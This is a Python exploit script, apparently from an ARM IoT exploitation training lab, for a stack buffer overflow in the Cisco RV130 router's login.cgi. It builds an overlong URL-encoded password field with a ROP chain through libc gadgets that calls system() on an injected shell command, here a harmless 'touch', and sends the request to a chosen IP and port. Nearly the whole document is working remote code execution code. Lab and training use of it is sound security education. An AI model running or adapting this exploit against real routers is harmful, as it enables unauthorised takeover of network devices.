#!/usr/bin/python
#
# The ARM IoT Exploit Laboratory
# by Saumil Shah
#
# Exploit template for Cisco RV130 router

import struct, sys, re, socket


##### HELPER FUNCTIONS #####

def pack32(value):
    return struct.pack("<I", value)  # little byte order

def pack16n(value):
    return struct.pack(">H", value)  # big/network byte order

def urlencode(buf):
    s = ""
    for b in buf:
        if re.match(r"[a-zA-Z0-9\/]", b) is None:
            s += "%%%02X" % ord(b)
        else:
            s += b
    return s

##### HELPER FUNCTIONS FOR ROP CHAINING #####

# function to create a libc gadget
# requires a global variable called libc_base
def libc(offset):
    return pack32(libc_base + offset)

# function to represent data on the stack
def data(data):
    return pack32(data)

# function to check for bad characters
# run this before sending out the payload
# e.g. detect_badchars(payload, "\x00\x0a\x0d/?")
def detect_badchars(string, badchars):
    for badchar in badchars:
        i = string.find(badchar)
        while i != -1:
            sys.stderr.write("[!] 0x%02x appears at position %d\n" % (ord(badchar), i))
            i = string.find(badchar, i+1)

##### MAIN #####
if len(sys.argv) != 3:
    print("Usage: expl.py <ip> <port>")
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]

# $1 = {<text variable, no debug info>} 0x35849144 <system>
system = pack32(0x35849144)

# 0x357fc000 0x35859000 0x00000000 r-x /emux/RV130/rootfs/lib/libc.so.0
libc_base = 0x357fc000

"""
ROP Gadget Flow:
1. Gadget

# r5 -> system
# r6 -> next gadget
0x00024278: mov r2, r5; blx r6;


2. Gadget
# sp -> points to our command
# r2 is set with the previous gadget to point to system
0x00041308: mov r0, sp; blx r2;
"""


"""
0x00041308: mov r0, sp; blx r2;
"""
mov_r0_sp_blx_r2 = pack32(libc_base + 0x00041308)

pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM"
pattern += system 
pattern += mov_r0_sp_blx_r2
pattern += "PPPPQQQQRRRRSSSSTTTT"


buf = "A" * (446-len(pattern))
buf += pattern

rop = ''

"""
0x358494e8 <+36>:    ldr     r0, [sp, #4]
0x358494ec <+40>:    add     sp, sp, #12
0x358494f0 <+44>:    ldmfd   sp!, {pc}
"""
ldr_r0 = pack32(0x358494e8)


# 0x00052620: pop {r2, r3}; bx lr;
pop_r2_r3_bx_lr = pack32(libc_base + 0x00052620)

# THUMB: 0x00020e78 (0x00020e79): pop {r2, r6, pc};
# doesn't seem to work using THUMB gadgets :(
#pop_r2_r6_pc = pack32(libc_base + 0x00020e78)

#rop += ldr_r0
#rop += pop_r2_r6_pc

"""
# r5 -> system
# r6 -> next gadget
0x00024278: mov r2, r5; blx r6;
"""
rop += pack32(libc_base + 0x00024278)

rop += 'touch /tmp/esjaywashere;#'

# Not relevant
rop += data(0x48484848)
rop += data(0x49494949)
rop += data(0x50505050)

buf = buf + rop
buf += "F"*100

detect_badchars(buf, "\x00")

pwd = urlencode(buf)
data = "submit_button=login&submit_type=&gui_action=&default_login=1&wait_time=0&change_action=&enc=1&user=cisco&pwd=%s&sel_lang=EN" % pwd
uri = "/login.cgi"

request = "POST %s HTTP/1.0\n" % uri
request += "Host: 127.0.0.1\n"
request += "Content-Length: %s\n" % len(data)
request += "Content-Type: application/x-www-form-urlencoded\n\n"
request += "%s\n" % data


#print request,
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, int(port)))
s.send(request)
